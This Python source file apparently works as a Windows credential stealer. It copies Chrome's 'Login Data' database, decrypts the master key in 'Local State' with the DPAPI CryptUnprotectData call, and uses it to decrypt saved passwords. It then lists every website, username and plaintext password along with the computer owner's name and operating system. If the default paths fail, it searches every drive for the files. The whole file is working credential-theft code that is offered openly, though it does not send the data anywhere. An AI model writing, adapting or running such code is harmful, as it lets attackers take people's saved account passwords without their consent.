import base64
import datetime
import getpass
import json
import os
import platform
import string
import shutil
import sqlite3
import BCrypt
from ctypes import windll, cdll, POINTER, Structure, c_char, byref, create_string_buffer
from ctypes.wintypes import DWORD


# Stuff that's needed for ctypes call
CryptUnprotectData = windll.crypt32.CryptUnprotectData  # Stores the call we want
CRYPTPROTECT_UI_FORBIDDEN = 0x01  # Flag used when the (UI) is not an option. Needed in order for it to work
LocalFree = windll.kernel32.LocalFree  # De-allocates ptr
memcpy = cdll.msvcrt.memcpy  # Sets up memory copy


# Same as C structure
class DataBlob(Structure):
    _fields_ = [
        ('cbData', DWORD),  # A DWORD variable that contains the count, in bytes, of data.
        ('pbData', POINTER(c_char))  # A pointer to the data buffer.
    ]


# Returns the file path for any file given
def find(name, path):
    for root, dirs, files in os.walk(path):  # 3 Tuple, which is why it needs root, dir, & files
        if name in files:
            return os.path.join(root, name)


# List the hard drives on PC
def list_partition():
    drive = []
    GetLogicalDrives = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if GetLogicalDrives & 1:  # determines if the drive is there
            drive.append(letter)  # adds letter to list
        GetLogicalDrives >>= 1  # reset conditional
    return drive


# display's the owner of the pc and current OS
def get_info():
    s = ""
    name = getpass.getuser()
    OsName = platform.system()
    s += "%s\n" % (f"System belongs to: {name}\nOperating System: {OsName}",)
    return s


# Gets the contents of the Login Data file (Username, websites, passwords)
def OpenLoginDb(file):
    shutil.copy2(file, "spectre.db")  # makes a temp DB file so chrome doesn't have to be shut down
    connection = sqlite3.connect("spectre.db", timeout=20)  # Connect to DB, Timeout fixed an issue I had
    cursor = connection.cursor()  # Points at rows and moves down, like a mouse cursor
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')  # Gets the fields we want
    FinalData = cursor.fetchall()  # Puts all the data into a variable
    cursor.close()  # Close the SQL command
    connection.close()  # Close the SQL connection
    os.remove("spectre.db")  # Get rid of the temp DB file
    return FinalData  # Returns all the information that we stored from the login file DB


# gets the content within local state which contains the blob key
def getEncryptedKeyData(path):
    with open(path) as local_file:  # open the file
        LocalState = local_file.read()  # reads contents
        LocalState = json.loads(LocalState)  # turns text into python obj
    LocalStateParsed = base64.b64decode(LocalState["os_crypt"]["encrypted_key"])  # parse the filed with the key
    LocalStateParsed = LocalStateParsed[5:]  # removes DPAPI infron of key
    return LocalStateParsed


# decrypts Chrome pw below version 80
def decrypt32(EncryptedKey):
    s = ""
    BufferIn = create_string_buffer(EncryptedKey, len(EncryptedKey))  # Creates char array
    BlobIn = DataBlob(len(EncryptedKey), BufferIn)  # stores info into struct
    BlobOut = DataBlob()
    # Returns true when the same "person" has the same logon creds and the "person" that encrypted it
    try:
        # uses windows dll to make the call.
        if CryptUnprotectData(byref(BlobIn), None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, byref(BlobOut)):
            cbData = int(BlobOut.cbData)
            pbData = BlobOut.pbData
            buffer = create_string_buffer(cbData)
            memcpy(buffer, pbData, cbData)  # Copies
            LocalFree(pbData)  # De-allocate the pointer
            return buffer.raw  # returns the pw
        else:
            pass
    except Exception as Jenova:
        s += "%s\n" % (f"Exception: {Jenova}",)


# calls BCryptDecrypt dll to get the passwords above chrome V80
def decrypt_above_80(ciphertext, key):
    s = ""
    try:
        nonce = ciphertext[3:15]  # strips the version off the pw and stores 16 bytes from the pw being passed in
        cipher = ciphertext[15:]  # puts only the first 16 bytes which is where the password is stored
        DecryptedPass = BCrypt.BCryptDecrypt(key, nonce, cipher)  # Call BCrypt were it decrypts the pw using BCrypt dll
        return DecryptedPass[:-16]  # Strips the last 16 bytes off since its junk
    except Exception as Jenova:
        s += "%s\n" % (f"Exception: {Jenova}",)


# main
def main():
    s = ""
    DbResults = ""
    DecryptedKey = ""
    begin = datetime.datetime.now()  # used to calculate runtime
    drives = list_partition()  # list the partitions with Windows
    # Defualt path locations to look
    DefaultLocal = r'{0}\AppData\Local\Google\Chrome\User Data\Local State'.format(os.path.expanduser('~'))
    DefaultLogin = r'{0}\AppData\Local\Google\Chrome\User Data\Default\Login Data'.format(os.path.expanduser('~'))
    for drive in drives:  # goes though each hard drive on windows to find files.
        drive = drive + ":\\"
        try:  # Try incase file path is default
            EncryptedKey = getEncryptedKeyData(DefaultLocal)  # Gets the key
            DecryptedKey = decrypt32(EncryptedKey)  # Spits out the decrypted key we need
            DbResults = OpenLoginDb(DefaultLogin)  # Function call to open the DB
            break
        except Exception as Jenova:
            # s += "%s\n" % (f"Exception{Jenova}",)
            s += "%s\n" % (f"Drive currently being scanned{drive}",)
            chrome = find("chrome.exe", drive)  # Scans to find google chrome executable
            LocalState = find("Local State", drive)  # Scans for local state file (blob)
            LoginData = find("Login Data", drive)  # Scans for login data file (locked DB)
            if chrome:  # If chrome is found proceed to login data and local state
                if LoginData:  # and local state
                    EncryptedKey = getEncryptedKeyData(LocalState)  # Gets the key after being broken down to base64
                    DecryptedKey = decrypt32(EncryptedKey)  # Spits out the blob key we need
                    DbResults = OpenLoginDb(LoginData)  # Function call to open the DB
                    break
            elif LoginData:  # if chrome isn't found, proceed to try and find login data and local state
                EncryptedKey = getEncryptedKeyData(LocalState)  # Gets the blob data after being broken down to base64
                DecryptedKey = decrypt32(EncryptedKey)  # Spits out the blob key we need
                DbResults = OpenLoginDb(LoginData)  # Function call to open the DB            break
            else:  # Nothing found on Windows regarding chrome or the other files, just exit and print remaining  info
                s += "%s\n" % (f"Chrome and other required files not found. Exiting.",)
                break

    # Results here so the logic statements aren't more of a mess
    for results in DbResults:  # Reads thru database file
        below_v80 = decrypt32(results[2])
        above_v80 = decrypt_above_80(results[2], DecryptedKey)  # Pass in the passwords, and the blob key (AES key)
        s += "%s\n" % (f"Website:  {results[0]}",)
        s += "%s\n" % (f"Username: {results[1]}",)
        try:
            s += "%s\n" % (f"Password below V80: {below_v80.decode('utf8')}",)
        except Exception as Jenova:
            s += "%s\n" % (f"Password above V80: {above_v80.decode('utf8')}",)
    s += "%s\n" % get_info()
    s += "%s\n" % (datetime.datetime.now(),)
    s += "%s\n" % (datetime.datetime.now() - begin,) 
    return s


if __name__ == "__main__":
    main()
